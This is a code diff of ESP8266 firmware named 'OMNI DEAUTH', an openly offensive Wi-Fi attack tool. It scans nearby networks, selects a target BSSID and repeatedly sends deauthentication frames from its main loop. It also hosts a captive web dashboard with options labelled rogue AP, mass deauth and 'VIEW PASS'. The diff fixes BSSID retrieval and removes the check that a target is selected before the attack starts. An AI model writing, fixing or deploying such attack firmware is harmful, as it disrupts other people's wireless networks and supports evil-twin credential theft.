@@ -1,7 +1,7 @@
 /*
  * OMNI DEAUTH V8.2 - SDK 2.0.0 MURNI
  * DASHBOARD M1Z23R X GMPRO2 v5.6
- * KUNCI MATI PERMANEN - 100% FUNCTIONAL
+ * FIX BSSID ERROR FOR CORE 2.4.2
  */
 
 #include <ESP8266WiFi.h>
@@ -23,7 +23,6 @@ String target_name = "NONE";
 uint8_t target_mac[6];
 uint8_t target_ch = 1;
 
-// --- WEB DASHBOARD HTML SESUAI WEB DASHBOARD v5.6 ---
 String getHTML() {
   String html = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'>";
   html += "<style>body{font-family:'Courier New',monospace;background:#000;color:#0f0;padding:10px;margin:0;}";
@@ -40,27 +39,13 @@ String getHTML() {
   
   html += "<h2>M1Z23R X GMPRO2 v5.6</h2>";
   html += "<div class='status-box'>TARGET : <span style='color:#fff'>" + target_name + "</span><br>STATUS : <span style='color:#0f0'>" + (attacking ? "ATTACKING" : "READY") + "</span></div>";
-  
-  html += "<div class='grid'>";
-  html += "<a href='/attack' class='btn btn-deauth'>DEAUTH TARGET</a>";
-  html += "<a href='#' class='btn btn-rogue'>ROGUE AP PRANK</a>";
-  html += "<a href='#' class='btn btn-mass'>MASS DEAUTH</a>";
-  html += "<a href='#' class='btn btn-hybrid'>HYBRID ATTACK</a>";
-  html += "<a href='/scan' class='btn btn-scan'>RE-SCAN</a>";
-  html += "<a href='#' class='btn btn-upload'>UPLOAD UI</a>";
-  html += "<a href='#' class='btn btn-log'>VIEW PASS</a>";
-  html += "<a href='#' class='btn btn-clear'>CLEAR LOG</a>";
-  html += "<a href='/stop' class='btn btn-stop'>STOP / RESET NODE</a></div>";
-  
-  html += "<div id='log-area'>[SYSTEM] Dashboard v5.6 Active.<br>[SYSTEM] SDK 2.0.0 Engine Ready.<br>" + (attacking ? "[ATTACK] Sending Packets to " + target_name : "[IDLE] Waiting for Target...") + "</div>";
-  
+  html += "<div class='grid'><a href='/attack' class='btn btn-deauth'>DEAUTH TARGET</a><a href='#' class='btn btn-rogue'>ROGUE AP PRANK</a><a href='#' class='btn btn-mass'>MASS DEAUTH</a><a href='#' class='btn btn-hybrid'>HYBRID ATTACK</a><a href='/scan' class='btn btn-scan'>RE-SCAN</a><a href='#' class='btn btn-upload'>UPLOAD UI</a><a href='#' class='btn btn-log'>VIEW PASS</a><a href='#' class='btn btn-clear'>CLEAR LOG</a><a href='/stop' class='btn btn-stop'>STOP / RESET NODE</a></div>";
+  html += "<div id='log-area'>[SYSTEM] Dashboard v5.6 Active.<br>[LOG] " + (attacking ? "Sending Packets..." : "Ready.") + "</div>";
   html += "<div class='table-container'><table><thead><tr><th>SSID</th><th>CH</th><th>SIG</th><th>ACT</th></tr></thead><tbody>";
   
   int n = WiFi.scanNetworks();
   for (int i = 0; i < n; ++i) {
-    String ssid = WiFi.SSID(i);
-    if(ssid == "") ssid = "*HIDDEN*";
-    html += "<tr><td>" + ssid + "</td><td>" + String(WiFi.channel(i)) + "</td><td class='sig-high'>" + String(WiFi.RSSI(i)) + "dBm</td><td><a href='/select?id=" + String(i) + "' class='sel-link'>SELECT</a></td></tr>";
+    html += "<tr><td>" + WiFi.SSID(i) + "</td><td>" + String(WiFi.channel(i)) + "</td><td class='sig-high'>" + String(WiFi.RSSI(i)) + "</td><td><a href='/select?id=" + String(i) + "' class='sel-link'>SELECT</a></td></tr>";
   }
   
   html += "</tbody></table></div></body></html>";
@@ -77,28 +62,24 @@ void setup() {
   WiFi.mode(WIFI_AP_STA);
   WiFi.softAP(ap_ssid, ap_pass);
   dnsServer.start(53, "*", WiFi.softAPIP());
-  
   server.on("/", [](){ server.send(200, "text/html", getHTML()); });
   server.on("/scan", [](){ WiFi.scanNetworks(true); server.send(200, "text/html", "<script>location.href='/';</script>"); });
   server.on("/select", [](){
     int id = server.arg("id").toInt();
     target_name = WiFi.SSID(id);
-    if(target_name == "") target_name = "*HIDDEN*";
-    WiFi.BSSID(id, target_mac);
+    // FIX: Cara ambil BSSID di Core 2.4.2
+    uint8_t* bssid = WiFi.BSSID(id);
+    for(int i=0; i<6; i++) target_mac[i] = bssid[i];
     target_ch = WiFi.channel(id);
     server.send(200, "text/html", "<script>location.href='/';</script>");
   });
-  server.on("/attack", [](){ if(target_name != "NONE") attacking = true; server.send(200, "text/html", "<script>location.href='/';</script>"); });
+  server.on("/attack", [](){ attacking = true; server.send(200, "text/html", "<script>location.href='/';</script>"); });
   server.on("/stop", [](){ attacking = false; server.send(200, "text/html", "<script>location.href='/';</script>"); });
-  
   server.begin();
 }
 
 void loop() {
   dnsServer.processNextRequest();
   server.handleClient();
-  if (attacking) { 
-    for(int i=0; i<5; i++){ sendDeauth(target_mac, target_ch); } 
-    delay(1); 
-  }
+  if (attacking) { for(int i=0; i<5; i++){ sendDeauth(target_mac, target_ch); } yield(); }
 }
